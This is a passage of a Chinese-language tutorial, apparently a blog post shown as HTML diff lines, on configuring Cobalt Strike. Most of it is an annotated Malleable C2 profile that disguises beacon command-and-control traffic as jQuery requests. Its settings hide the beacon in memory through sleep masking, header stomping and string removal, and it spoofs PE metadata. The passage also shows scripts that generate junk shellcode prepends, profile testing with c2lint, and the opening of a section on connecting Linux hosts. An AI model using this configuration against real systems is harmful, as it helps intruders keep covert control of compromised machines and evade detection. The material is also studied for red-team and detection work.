class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs tcl">详细分析：<br><span class="hljs-comment"># Malleable C2 Profile</span><br><span class="hljs-comment"># Version: CobaltStrike 4.5</span><br><span class="hljs-comment"># File: jquery-c2.4.5.profile</span><br><span class="hljs-comment"># Description: </span><br><span class="hljs-comment"># c2 profile attempting to mimic a jquery.js request</span><br><span class="hljs-comment"># uses signed certificates</span><br><span class="hljs-comment"># or self-signed certificates</span><br><span class="hljs-comment"># Authors: @joevest, @andrewchiles, @001SPARTaN </span><br><span class="hljs-comment">### Global Option Block</span><br><br><span class="hljs-comment"># 设置全局变量 sample_name , 值是当前文件名</span><br><span class="hljs-keyword">set</span> sample_name <span class="hljs-string">&quot;demo（文件名）&quot;</span>;<br><span class="hljs-comment"># 设置心跳包的时间 , 单位毫秒</span><br><span class="hljs-keyword">set</span> sleeptime <span class="hljs-string">&quot;1000&quot;</span><span class="hljs-comment">; # 45 Seconds 1000毫秒==1秒</span><br><span class="hljs-comment"># set sleeptime &quot;&lt;60000&gt;&quot;; # 1 Minute , 默认的</span><br><span class="hljs-comment"># 设置心跳包时间的波动范围 45 +- 45*37% </span><br><span class="hljs-keyword">set</span> jitter <span class="hljs-string">&quot;50&quot;</span><span class="hljs-comment">; # % jitter 1 +- 1*50%</span><br><span class="hljs-comment"># 意味着每次HTTP服务器响应时（cs上监听服务选择的http协议），都会附加一个长度在0到100个字符之间的随机字符串。这样做的目的是为了增加服务器响应的大小的不可预测性，使得Cobalt Strike的通信模式更难以通过网络监控工具被识别和分析。</span><br><span class="hljs-keyword">set</span> data_jitter <span class="hljs-string">&quot;100&quot;</span>; <br><span class="hljs-comment"># 设置全局的UA头</span><br><span class="hljs-keyword">set</span> useragent <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like </span><br><span class="hljs-string">Gecko) Chrome/124.0.0.0 Safari/537.36&quot;</span>;<br><br>https-certificate ssl证书配置：<br>https-certificate &#123;<br><span class="hljs-keyword">set</span> C <span class="hljs-string">&quot;US&quot;</span><span class="hljs-comment">; #国家</span><br><span class="hljs-keyword">set</span> CN <span class="hljs-string">&quot;jquery.com&quot;</span>;<br><span class="hljs-keyword">set</span> O <span class="hljs-string">&quot;jQuery&quot;</span>;<br><span class="hljs-keyword">set</span> OU <span class="hljs-string">&quot;Certificate Authority&quot;</span>;<br><span class="hljs-keyword">set</span> validity <span class="hljs-string">&quot;365&quot;</span>;<br><span class="hljs-keyword">set</span> keystore <span class="hljs-string">&quot;cobaltstrike.store&quot;</span><span class="hljs-comment">; # 证书文件</span><br><span class="hljs-keyword">set</span> password <span class="hljs-string">&quot;1qazwsx&quot;</span><span class="hljs-comment">; # 证书密码   //密码不正确会报错（前提:监听器使用的是https协议）</span><br>&#125;<br><br>SMB和TCP , smb会在横向渗透使用到:<br><span class="hljs-comment">### SMB Beacon</span><br><span class="hljs-keyword">set</span> pipename <span class="hljs-string">&quot;mojo.5688.8052.183894939787088877##&quot;</span><span class="hljs-comment">; # # smb管道的名字</span><br><span class="hljs-keyword">set</span> pipename_stager <span class="hljs-string">&quot;mojo.5688.8052.35780273329370473##&quot;</span><span class="hljs-comment">; # smb stager管道的名字</span><br><span class="hljs-keyword">set</span> smb_frame_header <span class="hljs-string">&quot;\x80&quot;</span>;<br><span class="hljs-comment">### TCP Beacon 监听端口</span><br><span class="hljs-keyword">set</span> tcp_port <span class="hljs-string">&quot;42585&quot;</span><br><span class="hljs-keyword">set</span> tcp_frame_header <span class="hljs-string">&quot;\x80&quot;</span><br><br>DNS beacon , 不经常使用 , 但是对于只有DNS协议出网的设备可以使用:<br>dns-beacon &#123;<br><span class="hljs-keyword">set</span> dns_idle <span class="hljs-string">&quot;74.125.196.113&quot;</span><span class="hljs-comment">; # # 第一次dns查询的地址</span><br><span class="hljs-keyword">set</span> dns_max_txt <span class="hljs-string">&quot;252&quot;</span><span class="hljs-comment">;# # 昀大查询次数 , 255以下 , 能被4整除</span><br><span class="hljs-keyword">set</span> dns_sleep <span class="hljs-string">&quot;0&quot;</span><span class="hljs-comment">; # # sleep时间</span><br><span class="hljs-keyword">set</span> dns_ttl <span class="hljs-string">&quot;5&quot;</span><span class="hljs-comment">; # ttl值</span><br><span class="hljs-keyword">set</span> maxdns <span class="hljs-string">&quot;255&quot;</span><span class="hljs-comment">; # 昀大dns服务转接数量</span><br><span class="hljs-keyword">set</span> dns_stager_prepend <span class="hljs-string">&quot;.resources.123456.&quot;</span><span class="hljs-comment">; # # 使用dns协议的马,pe头追加的内容</span><br><span class="hljs-keyword">set</span> dns_stager_subhost <span class="hljs-string">&quot;.feeds.123456.&quot;</span><span class="hljs-comment">; # # 子域名的查询配置</span><br><span class="hljs-comment"># DNS subhosts override options, added in version 4.3</span><br><span class="hljs-keyword">set</span> beacon <span class="hljs-string">&quot;a.bc.&quot;</span>;<br><span class="hljs-keyword">set</span> get_A <span class="hljs-string">&quot;b.1a.&quot;</span>;<br><span class="hljs-keyword">set</span> get_AAAA <span class="hljs-string">&quot;c.4a.&quot;</span>;<br><span class="hljs-keyword">set</span> get_TXT <span class="hljs-string">&quot;d.tx.&quot;</span>;<br><span class="hljs-keyword">set</span> put_metadata <span class="hljs-string">&quot;e.md.&quot;</span>;<br><span class="hljs-keyword">set</span> put_output <span class="hljs-string">&quot;f.po.&quot;</span>;<br><span class="hljs-keyword">set</span> ns_response <span class="hljs-string">&quot;zero&quot;</span>;<br><br>SSH beacons: 配置用于横向移动的SSH伪Beacon。<br><span class="hljs-keyword">set</span> ssh_banner <span class="hljs-string">&quot;OpenSSH_7.4 Debian (protocol 2.0)&quot;</span><span class="hljs-comment">; # SSH连接的banner信息</span><br><span class="hljs-keyword">set</span> ssh_pipename <span class="hljs-string">&quot;wkssvc##&quot;</span><span class="hljs-comment">; # 定义了用于SSH伪Beacon通信的命名管道的名称前缀,##是一个占位符</span><br><br><span class="hljs-keyword">http</span>-stager 块是用来自定义HTTP阶段化（staging）过程的配置。阶段化是Cobalt Strike中的一个重要概念，它指的是将第二阶段的有效载荷（即用于后渗透测试的代码）传输到已经受到攻击者控制的主机上的过程。<br><span class="hljs-comment"># 用于指定是否启用通过HTTP、HTTPS或DNS进行阶段化(第二阶段)的有效载荷（payload）托管。</span><br><span class="hljs-keyword">set</span> host_stage <span class="hljs-string">&quot;true&quot;</span><span class="hljs-comment">; # Host payload for staging over HTTP, HTTPS, or DNS. Required by </span><br>stagers.<span class="hljs-keyword">set</span><br><span class="hljs-keyword">http</span>-stager &#123; <br><span class="hljs-keyword">set</span> uri_x86 <span class="hljs-string">&quot;/jquery-3.3.1.slim.min.js&quot;</span>;<br><span class="hljs-keyword">set</span> uri_x64 <span class="hljs-string">&quot;/jquery-3.3.2.slim.min.js&quot;</span>;    //weblog中访问的路径（混淆）<br>server &#123;<br>header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;NetDNA-cache/2.2&quot;</span>;<br>header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;max-age=0, no-cache&quot;</span>;<br>header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span>;<br>header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span>;<br>header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/javascript; charset=utf-8&quot;</span>;<br>output &#123;<br><span class="hljs-comment">## The javascript was changed. Double quotes and backslashes were escaped to </span><br>properly render (Refer to Tips <span class="hljs-keyword">for</span> Profile Parameter Values)<br><span class="hljs-comment"># 2nd Line</span><br><br><span class="hljs-keyword">http</span>-config , 不单单是<span class="hljs-keyword">http</span>实际上也是https的全局响应头配置<br><span class="hljs-keyword">http</span>-config &#123;<br><span class="hljs-keyword">set</span> headers <span class="hljs-string">&quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;</span>;<br> header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Apache&quot;</span>;<br> header <span class="hljs-string">&quot;Keep-Alive&quot;</span> <span class="hljs-string">&quot;timeout=10, max=100&quot;</span>;<br> header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;Keep-Alive&quot;</span>;<br><span class="hljs-keyword">set</span> trust_x_forwarded_for <span class="hljs-string">&quot;true&quot;</span>;<br><span class="hljs-keyword">set</span> block_useragents <span class="hljs-string">&quot;curl*,lynx*,wget*&quot;</span>; <br>&#125;<br><br><span class="hljs-keyword">http</span>-get (无缩进要求) , 命令的下发相当于是teamserver(cs服务端)向受害者发送一个get请求<br><span class="hljs-comment"># 下发命令访问的uri</span><br><span class="hljs-keyword">set</span> uri <span class="hljs-string">&quot;/jquery-3.3.1.min.js&quot;</span>;<br><span class="hljs-comment"># 请求方法</span><br><span class="hljs-keyword">set</span> verb <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-comment"># 客户端配置</span><br> client &#123;<br><span class="hljs-comment"># 请求头配置</span><br> header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;<br><span class="hljs-comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span><br> header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://code.jquery.com/&quot;</span>;<br> header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span>;<br><span class="hljs-comment"># 元数据配置</span><br> metadata &#123;<br> base64url;<br> prepend <span class="hljs-string">&quot;__cfduid=&quot;</span>;<br> header <span class="hljs-string">&quot;Cookie&quot;</span>;<br> &#125;<br> &#125;<br><span class="hljs-comment"># 服务端配置</span><br> server &#123;<br><span class="hljs-comment"># 响应头设置</span><br> header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;NetDNA-cache/2.2&quot;</span>;<br> header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;max-age=0, no-cache&quot;</span>;<br> header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span>;<br> header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span>;<br> header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/javascript; charset=utf-8&quot;</span>;<br><span class="hljs-comment"># # 输出信息</span><br> output &#123; <br> mask;<br> base64url;<br><span class="hljs-comment">## The javascript was changed. Double quotes and backslashes were escaped to </span><br>properly render (Refer to Tips <span class="hljs-keyword">for</span> Profile Parameter Values)<br><span class="hljs-comment"># 2nd Line</span><br><span class="hljs-comment"># 响应中html页面头部信息</span><br>....<br>....<br><br><br><span class="hljs-keyword">http</span>-post 结果的回传相当于受害者向teamserver发送一个post请求（命令下发是GET请求，回传是POST请求）<br><span class="hljs-keyword">http</span>-post &#123;<br><span class="hljs-comment"># 请求的地址</span><br><span class="hljs-keyword">set</span> uri <span class="hljs-string">&quot;/jquery-3.3.2.min.js&quot;</span>;<br><span class="hljs-comment"># 请求的方法</span><br><span class="hljs-keyword">set</span> verb <span class="hljs-string">&quot;POST&quot;</span>;<br><span class="hljs-comment"># 客户端配置</span><br> client &#123;<br><span class="hljs-comment"># 请求头</span><br> header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;<br><span class="hljs-comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span><br> header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://code.jquery.com/&quot;</span>;<br> header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span>;<br><span class="hljs-comment"># 参数</span><br> id &#123;<br> mask; <br> base64url;<br> parameter <span class="hljs-string">&quot;__cfduid&quot;</span>;<br> &#125;<br><span class="hljs-comment"># 输出信息 </span><br> output &#123;<br> mask;<br> base64url;<br> print;<br> &#125;<br> &#125;<br><span class="hljs-comment"># 服务端配置</span><br> server &#123;<br><span class="hljs-comment"># 响应头配置</span><br> header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;NetDNA-cache/2.2&quot;</span>;<br> header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;max-age=0, no-cache&quot;</span>;<br> header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span>;<br> header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;keep-alive&quot;</span>;<br> header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/javascript; charset=utf-8&quot;</span>;<br><span class="hljs-comment"># 输出的内容</span><br> output &#123;<br> mask;<br> base64url;<br><span class="hljs-comment">## The javascript was changed. Double quotes and backslashes were escaped to </span><br>properly render (Refer to Tips <span class="hljs-keyword">for</span> Profile Parameter Values)<br><span class="hljs-comment"># 2nd Line</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix">stage ( 第二阶段的shellcode ), 用于自定义Beacon（Cobalt Strike的恶意软件组件）在内存中的加载方式和表现形式也就是用来自定义伪装cs自带的那些命令是如何在内存中表现的<br>stage &#123;<br><span class="hljs-comment"># CS 4.2 added allocator and MZ header overrides</span><br>set allocator <span class="hljs-string">&quot;VirtualAlloc&quot;</span>; <span class="hljs-comment"># allocator用于设置Beacon的反射加载器（Reflective Loader）</span><br>如何为代理（agent）分配内存 Options <span class="hljs-params">are:</span> HeapAlloc, MapViewOfFile, and VirtualAlloc<br><span class="hljs-comment">#set magic_mz_x86 &quot;MZRE&quot;;</span><br><span class="hljs-comment">#set magic_mz_x64 &quot;MZAR&quot;;</span><br>set magic_pe <span class="hljs-string">&quot;NO&quot;</span>; <span class="hljs-comment"># 不覆盖Beacon的反射加载器使用的PE文件</span><br>set userwx <span class="hljs-string">&quot;false&quot;</span>; <span class="hljs-comment"># 不要求beacon在内存中的权限可读可写可执行,如果是rwx的权限比较</span><br>可疑<br>set stomppe <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># 要求反射加载器在加载Beacon有效载荷后覆盖MZ（Microsoft </span><br>Windows Portable Executable File）头、PE头和e_lfanew值。<br>set obfuscate <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># obfuscate启用对反射DLL的导入表进行混淆，覆盖未使用的头部内容，</span><br>并要求反射加载器在没有DLL头的情况下将Beacon复制到新内存中<br>set cleanup <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># cleanup要求Beacon尝试释放与反射DLL包相关联的内存。</span><br><span class="hljs-comment"># CS 3.12 Addition &quot;Obfuscate and Sleep&quot;</span><br>set sleep_mask <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># 启用在Beacon（HTTP、SMB、TCP Beacons）在内存中睡眠或等待</span><br>新连接<span class="hljs-operator">/</span>数据之前对其进行混淆的功能<br><span class="hljs-comment"># CS 4.1 </span><br>set smartinject <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># 启用使用嵌入式函数指针提示来引导Beacon代理</span><br>set checksum <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment"># 设置Beacon的PE头部中的校验和值。</span><br>set compile_time <span class="hljs-string">&quot;11 Nov 2016 04:08:32&quot;</span>; <span class="hljs-comment"># 设置Beacon的PE头部中的编译时间</span><br>set entry_point <span class="hljs-string">&quot;650688&quot;</span>; <span class="hljs-comment"># 设置Beacon的PE头部中的入口点值。</span><br>set image_size_x86 <span class="hljs-string">&quot;4661248&quot;</span>;<br>set image_size_x64 <span class="hljs-string">&quot;4661248&quot;</span>;<br>set name <span class="hljs-string">&quot;srv.dll&quot;</span>;<br>set rich_header <br><span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>3e<span class="hljs-char escape_">\x</span>98<span class="hljs-char escape_">\x</span>fe<span class="hljs-char escape_">\x</span>75<span class="hljs-char escape_">\x</span>7a<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>7a<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>7a<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>73<span class="hljs-char escape_">\x</span>81<span class="hljs-char escape_">\x</span>03<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>fc<span class="hljs-char escape_">\x</span>f</span><br><span class="hljs-string">9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>27<span class="hljs-char escape_">\x</span>79<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>7a<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>91<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>83<span class="hljs-char escape_">\x</span>fd<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>91<span class="hljs-char escape_">\x</span></span><br><span class="hljs-string">27<span class="hljs-char escape_">\x</span>65<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>95<span class="hljs-char escape_">\x</span>27<span class="hljs-char escape_">\x</span>77<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>94<span class="hljs-char escape_">\x</span>27<span class="hljs-char escape_">\x</span>6c<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17\</span><br><span class="hljs-string">xa4<span class="hljs-char escape_">\x</span>9e<span class="hljs-char escape_">\x</span>27<span class="hljs-char escape_">\x</span>56<span class="hljs-char escape_">\x</span>f8<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>6f<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>7b<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>17<span class="hljs-char escape_">\x</span>a4<span class="hljs-char escape_">\x</span>92<span class="hljs-char escape_">\x</span>27<span class="hljs-char escape_">\x</span>7b<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90\</span><br><span class="hljs-string">x26<span class="hljs-char escape_">\x</span>52<span class="hljs-char escape_">\x</span>69<span class="hljs-char escape_">\x</span>63<span class="hljs-char escape_">\x</span>68<span class="hljs-char escape_">\x</span>7a<span class="hljs-char escape_">\x</span>f9<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>26<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>0</span><br><span class="hljs-string">0<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>00&quot;</span>; <span class="hljs-comment"># 添加到DLL中的元信息数据。</span><br> transform-x86 &#123; <span class="hljs-comment"># 填充和转换Beacon的反射DLL阶段</span><br> prepend <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90&quot;</span>; <span class="hljs-comment"># 前置</span><br> strrep <span class="hljs-string">&quot;ReflectiveLoader&quot;</span> <span class="hljs-string">&quot;execute&quot;</span>; <span class="hljs-comment"># 字符串替换</span><br> strrep <span class="hljs-string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># Remove this text</span><br> strrep <span class="hljs-string">&quot;beacon.dll&quot;</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># Remove this text</span><br> &#125;<br> transform-x64 &#123; <span class="hljs-comment"># transform the x64 rDLL stage</span><br> prepend <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>90&quot;</span>; <span class="hljs-comment"># prepend nops</span><br> strrep <span class="hljs-string">&quot;ReflectiveLoader&quot;</span> <span class="hljs-string">&quot;execute&quot;</span>; <span class="hljs-comment"># Change this text in the Beacon DLL</span><br> strrep <span class="hljs-string">&quot;beacon.x64.dll&quot;</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># Remove this text in the Beacon DLL</span><br> &#125;<br> stringw <span class="hljs-string">&quot;jQuery&quot;</span>; <span class="hljs-comment"># stringw用于将字符串&quot;jQuery&quot;添加到DLL中，是为了使DLL看起来更像正常的</span><br>JavaScript库文件，从而减少被检测的可能性<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>修改profile文件, 增强opsec的效果</strong></p>
+<p>prepend.py是一个 python 脚本，它生成动态垃圾 shellcode，该 shellcode 将附加在实际 shellcode 的开头。要使用该脚本</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> prepend.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+<p>复制输出并将其粘贴到配置文件中（在 transform-x64 或 transform-x86 块内）。配置文件将如下所示：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">transform-x64 &#123;<br> ...<br> prepend <br><span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>44<span class="hljs-char escape_">\x</span>40<span class="hljs-char escape_">\x</span>4B<span class="hljs-char escape_">\x</span>43<span class="hljs-char escape_">\x</span>4C<span class="hljs-char escape_">\x</span>48<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>66<span class="hljs-char escape_">\x</span>90<span class="hljs-char escape_">\x</span>0F<span class="hljs-char escape_">\x</span>1F<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>66<span class="hljs-char escape_">\x</span>0F<span class="hljs-char escape_">\x</span>1F<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>0F<span class="hljs-char escape_">\x</span>1F<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>00\</span><br><span class="hljs-string">x0F<span class="hljs-char escape_">\x</span>1F<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>0F<span class="hljs-char escape_">\x</span>1F<span class="hljs-char escape_">\x</span>00&quot;</span>;<br> ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>rich_header.py是一个 python 脚本，它生成动态 shellcode，负责编译器插入的元信息。Rich 标头是一个 PE 部分，用作 Windows 可执行文件生成环境的指纹。要使用该脚本，请执行：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> rich_header.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+<p>复制输出并将其粘贴到配置文件中。配置文件将如下所示：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">stage &#123;<br> ...<br> set rich_header <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>2e<span class="hljs-char escape_">\x</span>9a<span class="hljs-char escape_">\x</span>ad<span class="hljs-char escape_">\x</span>f1...&quot;</span>;<br> ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>3.4检查profile文件</strong></p>
+<p>测试是否可用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x c2lint<br>./c2lint [/path/to/my.profile] <span class="hljs-comment"># 如 ./c2lint bing_jx.profile</span><br><span class="hljs-comment"># 进行各种协议 如 smb , http , https的请求模拟 , 判断是否可用 , 请求结束下面会有结果输出 (黄色警告,红色语法错误)</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/Peithon/JustC2filemalleable-c2-master">https://github.com/Peithon/JustC2filemalleable-c2-master</a></p>
+<h2 id="四-CS配置Linux上线"><a href="#四-CS配置Linux上线" class="headerlink" title="四. CS配置Linux上线"></a>四. CS配置Linux上线</h2><h3 id="下载-CrossC2（只支持https协议）"><a href="#下载-CrossC2（只支持https协议）" class="headerlink" title="下载 CrossC2（只支持https协议）"></a><strong>下载 CrossC2</strong>（只支持https协议）</h3><p>1.cs默认是不支持上线linux主机的 , 但是可以通过安装CrossC2插件实现</p>
